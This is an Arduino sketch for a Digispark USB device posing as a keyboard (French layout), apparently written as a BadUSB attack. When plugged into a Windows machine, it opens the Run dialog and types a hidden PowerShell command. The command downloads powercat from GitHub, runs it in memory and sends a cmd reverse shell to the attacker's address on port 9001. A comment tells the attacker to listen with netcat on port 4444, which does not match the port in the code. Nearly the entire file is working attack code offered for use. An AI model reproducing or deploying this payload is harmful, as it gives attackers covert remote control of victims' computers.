//Execute a netcat/powercat reverse shell by downloading powercat on the windows system and giving attacker a reverse shell
// on attacker machine write nc -lnvp 4444
#include "DigiKeyboardFr.h"

void setup() {
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("PowerShell.exe -WindowStyle Hidden -Command \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c yourip -p 9001 -e cmd\"");
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(1000);
}

void loop() {}
